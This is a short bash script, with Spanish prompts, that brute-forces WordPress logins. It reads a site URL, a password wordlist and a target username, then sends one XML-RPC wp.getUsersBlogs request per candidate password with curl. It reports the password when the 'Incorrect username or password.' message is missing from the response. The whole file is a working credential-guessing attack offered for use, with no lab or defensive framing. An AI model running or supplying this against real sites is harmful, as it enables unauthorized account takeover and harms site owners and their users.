#!/bin/bash
echo -e "Dirección del sitio web" && read direccion
echo -e "Ruta del diccionario" && read ruta
echo -e "Usuario a realizar fuerza bruta" && read user

PasswordBreaker(){
password=$1

file=""" 
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>$user</value></param> 
<param><value>${password}</value></param> 
</params> 
</methodCall>
"""

echo $file > file.xml

respuesta=$(curl -X POST "${direccion}" -d@file.xml)

if [ ! "$(echo $respuesta | grep 'Incorrect username or password.' 2>/dev/null)" ]; then
echo "La contraseña del usuario $user es $password"
exit 1 
        fi

}


cat $ruta | while read password ; do

PasswordBreaker $password

done
rm file.xml

